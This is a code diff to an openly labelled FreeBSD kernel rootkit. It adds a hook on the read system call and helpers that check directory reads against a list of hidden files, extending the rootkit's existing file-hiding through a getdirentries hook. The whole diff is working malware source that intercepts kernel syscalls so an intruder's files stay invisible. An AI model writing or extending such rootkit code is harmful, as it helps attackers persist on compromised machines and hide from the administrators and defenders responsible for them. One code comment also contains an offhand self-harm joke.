@@ -289,14 +289,111 @@ getdirentries_hook(struct thread *td, void *syscall_args)
 	return(0);
 }
 
+static int
+is_directory_of_hidden_file_of_index(struct thread *td, int fd, int index)
+{
+	int ret;
+	int len;
+
+	char *dirpath;
+	char *freebuf;
+
+	if (index >= NUM_HIDDEN_FILES)
+	{
+		return(0);
+	}
+
+	ret = generate_path_from_fd(td, fd, &dirpath, &freebuf);
+	if (ret)
+	{
+		return(0);
+	}
+
+	LOGD("[rootkit:is_directory_of_hidden_file_of_index] Directory is %s.\n", dirpath);
+	LOGD("[rootkit:is_directory_of_hidden_file_of_index] File path is %s.\n", hidden_files[index]);
+
+	len = strlen(dirpath);
+	ret = strncmp(dirpath, hidden_files[index], len) == 0;
+	LOGD("[rootkit:is_directory_of_hidden_file_of_index] Comparison resolves as %d.\n", ret);
+
+	free(freebuf, M_TEMP);
+
+	return(ret);
+}
+
+static const char *
+get_hidden_file_filename(unsigned int index)
+{
+	int len;
+	const char *filename;
+
+	if (index >= NUM_HIDDEN_FILES)
+	{
+		return NULL;
+	}
+
+	filename = hidden_files[index];
+	len = strlen(filename);
+
+	filename += len;
+	while (*filename != '/')
+	{
+		/* Should I kill myself or have a cup of coffee? */
+		filename--;
+	}
+	filename++;
+
+	return filename;
+}
+
+static int
+read_hook(struct thread *td, void *syscall_args)
+{
+	int i;
+	int ret;
+
+	struct file *fp;
+	struct vnode *vp;
+	cap_rights_t rights;
+
+	struct read_args *uap;
+	uap = (struct read_args *) syscall_args;
+
+	fp = NULL;
+
+	ret = getvnode(td, uap->fd, cap_rights_init(&rights, CAP_LOOKUP), &fp);
+	if (ret == 0)
+	{
+		vp = fp->f_vnode;
+		if (vp != NULL && vp->v_type == VDIR)
+		{
+			LOGI("[rootkit:read_hook] Directory read detected.\n");
+			for (i = 0; i < NUM_HIDDEN_FILES; i++)
+			{
+				if (is_directory_of_hidden_file_of_index(
+							td, uap->fd, i))
+				{
+					LOGI("[rootkit:read_hook] Directory read on hidden file detected.\n");
+				}
+			}
+		}
+
+		fdrop(fp, td);
+	}
+
+	return sys_read(td, syscall_args);
+}
+
 void
 hide_files(void)
 {
 	hook_syscall_set(SYS_getdirentries, getdirentries_hook);
+	hook_syscall_set(SYS_read, read_hook);
 }
 
 void
 unhide_files(void)
 {
 	hook_syscall_set(SYS_getdirentries, sys_getdirentries);
+	hook_syscall_set(SYS_read, sys_read);
 }
